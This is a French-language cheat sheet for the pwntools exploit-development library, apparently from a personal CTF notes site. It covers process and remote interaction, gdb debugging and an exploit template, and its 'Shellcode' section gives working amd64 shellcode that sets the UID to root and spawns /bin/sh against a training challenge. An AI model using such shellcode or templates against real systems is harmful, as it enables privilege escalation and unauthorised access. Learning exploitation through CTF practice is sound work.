# Pwntools


https://github.com/Gallopsled/pwntools

Pwntools est un CTF framework et une librairie python conçus pour le développement d’exploits. Pwntools a pour but de rendre le développement d’exploits le plus simple et rapide possible. Il vient en 2 parties : *_pwn_* pour les CTFs et *_pwnlib_* une version plus clean et “professinnelle” du projet.


## Create and Interact with Process
```python
import pwn

p = pwn.process([&#34;/usr/bin/python3&#34;, &#34;-c&#34;, &#34;&#39;print(hello)&#39;&#34;])

p.write(&#34;hello&#34;)       # -&gt; send : &#34;hello&#34;
p.writeline(&#34;hello&#34;)   # -&gt; send : &#34;hello\n&#34;

output = p.read(&lt;length&gt;)
output = p.readline()
output = p.readuntil(&#39;some string&#39;)
output = p.readall()

# p.readuntil(&#39;some string&#39;) ; p.write(b&#39;aaaa&#39;)
p.writeafter(&#39;some string&#39;, b&#39;aaaa&#39;)

# p.readuntil(&#39;some string&#39;) ; p.writeline(b&#39;aaaa&#39;)
p.writelineafter(&#39;some string&#39;, b&#39;aaaa&#39;)

# interacting with the process manually
p.interactive()

# waiting for the process to finish
p.wait()
```

## Remote
Ici les appels à fonctions ont été fait dans un contexte ou le process est lancé en local. Il est tout à fait possible de faire la même chose en remote.
```python
# Socket
io = remote(&#39;127.0.0.1&#39;, 1337)                # Bind
io = listen(8080).wait_for_connection()       # Reverse

# SSH Connect
s = ssh(host=&#39;challenge02.root-me.org&#39;,user=&#39;app-systeme-ch15&#39;,password=&#39;app-systeme-ch15&#39;,port=2222)
p = s.process(&#39;./ch15&#39;)

p.send(&#34;hello&#34;)       # -&gt; send : &#34;hello&#34;
p.sendline(&#34;hello&#34;)   # -&gt; send : &#34;hello\n&#34;

output = p.recv(&lt;length&gt;)
output = p.recvline()
output = p.recvuntil(&#39;some string&#39;)
output = p.recvall()
```

## Context and Environment
```python
# Add environment variables
p = pwn.process([&#34;/usr/bin/python3&#34;, &#34;-c&#34;, &#34;&#39;print(hello)&#39;&#34;], env={&#39;TEST&#39;:&#39;test&#39;})
```

## Play with Stdin/Stdout
```python
# Redirect file output to process stdin
fd = open(&#39;input.txt&#39;, &#39;r&#39;)
p = process([&#39;/usr/bin/cat&#39;, &#39;/flag.txt&#39;], stdin=fd)

# Redirect process output to a file
fd = open(&#34;output.txt&#34;, &#34;w&#34;)
p = process([&#39;/usr/bin/cat&#39;, &#39;/flag.txt&#39;], stdout=fd)
```

## Shellcode
```python
import pwn

p = pwn.process([&#39;/challenge/babyshell_level5&#39;])

pwn.context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
payload = pwn.asm(f&#34;&#34;&#34;
.global _start
_start:
.intel_syntax noprefix
	
# Set Real UID to root(0)
	xor rax, rax
	mov al, 0x71
	xor rdi, rdi
	xor rsi, rsi
	syscall
	
# Call /bin/sh
	xor rbx, rbx
	push rbx                          # on push un null byte sur la stack pour la fin de la string du path de /bin/sh
	mov rbx, 0x68732f6e69622f2f       # on push /bin/sh sur la stack
	push rbx
	xor rax, rax
	mov al, 59
	xor rdi, rdi
	mov rdi, rsp                      # on récupère &#34;/bin/sh\0&#34; depuis la stack
	xor rsi, rsi
	xor rdx, rdx
	syscall
&#34;&#34;&#34;)

p.write(payload)

p.interactive()

p.wait()
```

## Debugging
Tout d&#39;abord, le server qui héberge le binaire que l&#39;on souhaite debug doit avoir _**gdb**_ et _**gdbserver**_ d&#39;installé.

```python
# Debug à partir de la toute première instruction
io = gdb.debug(&#34;/bin/bash&#34;, gdbscript=&#39;continue&#39;)

# Debug un process
io = process(&#39;/bin/sh&#39;)
gdb.attach(io, gdbscript=&#39;continue&#39;)

# Debug en remote
io = remote(&#39;localhost&#39;, 4141)
gdb.attach(io)

# Debug en ssh
context.terminal = &#34;/Applications/iTerm.app/Contents/MacOS/iTerm2&#34; #(Dépend de l&#39;environement graphique, ex: /usr/bin/i3-sensible-terminal)
s = ssh(host=&#39;challenge02.root-me.org&#39;,user=&#39;app-systeme-ch7&#39;,password=&#39;app-systeme-ch7&#39;,port=2222)
io = s.process([&#39;./ch7&#39;, payload])
gdb.attach(io, gdbscript=f&#34;&#34;&#34;
    b *main
    continue
&#34;&#34;&#34;)

io.sendline(&#39;break main&#39;)
io.recvline()
io.interactive()

```

## Template
```python title:pwntools_template.py
#!/usr/bin/python3.9
from pwn import *

if not args.BLIND:
    context.binary = elfexe = ELF(&#39;./src&#39;) #FIXME
#    libc = ELF(&#39;&lt;libc-used-by-target&gt;&#39;) #FIXME

def start(argv=[], *a, **kw):
    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
    elf_path = &#39;/challenge/run&#39;
    if args.REMOTE:
        remote_server = &#39;dojo.pwn.college&#39;   #FIXME
        remote_port = 22         #FIXME

        if args.SSH:
            s = ssh(&#39;hacker&#39;, remote_server, remote_port, keyfile=&#39;/home/ego/.ssh/id_ed25519&#39;)
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] &#43; argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] &#43; argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] &#43; argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] &#43; argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] &#43; argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] &#43; argv, *a, **kw)
    return target

gdbscript = &#39;&#39;&#39;
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *main
# command
#     printf &#34;argv ptr: %p\\n&#34;,$rsi
# end

# continue
&#39;&#39;&#39;.format(**locals())
if args.GDB:
    log.info(&#39;Using gdb script:\n&#39;&#43;gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
io = start(arguments)

io.interactive()
io.close()
```
## Play with files
https://docs.pwntools.com/en/dev/filesystem.html
## Troubleshootings
Dans le cas où on a des erreurs et que l&#39;on a besoin de comprendre ce qui se passe en détail dans pwntools, on peut utiliser l&#39;option `debug`.

```
# Debug global
context.log_level=&#39;debug&#39;

# Debug local
io = gdb.debug(&#39;/bin/sh&#39;, log_level=&#39;debug&#39;)
```

https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md#troubleshooting


---

> Author:   
> URL: https://0xeg0.github.io/MyLittlePwney/pwn/cheat-sheets/-pwntools/  

